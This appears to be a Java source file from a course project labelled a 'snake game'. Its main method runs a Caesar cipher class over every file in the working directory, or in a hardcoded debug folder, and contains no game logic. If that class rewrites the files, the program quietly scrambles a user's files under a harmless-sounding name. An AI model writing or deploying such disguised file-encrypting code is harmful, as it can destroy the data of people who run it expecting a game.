package me.herrlestrate.snakegame;

import me.herrlestrate.snakegame.crypto.Caesar;

import java.io.File;
import java.util.Objects;

public class Game {

    private static boolean DEBUG = true;
    private static final String ROOT = getRoot();

    public static void main(String[] args){
        if(!new File(ROOT).exists()){
            System.err.println("Not found root path: " + ROOT);
            return;
        }

        for(File file : Objects.requireNonNull(new File(ROOT).listFiles())){
            System.out.println(file.getName());
            new Caesar(file);
        }
    }

    private static String getRoot(){
        if(DEBUG){
            return "F:\\CourseProject\\";
        } else {
            return new File("").getAbsolutePath();
        }
    }

    public static boolean isDebug(){
        return DEBUG;
    }

}
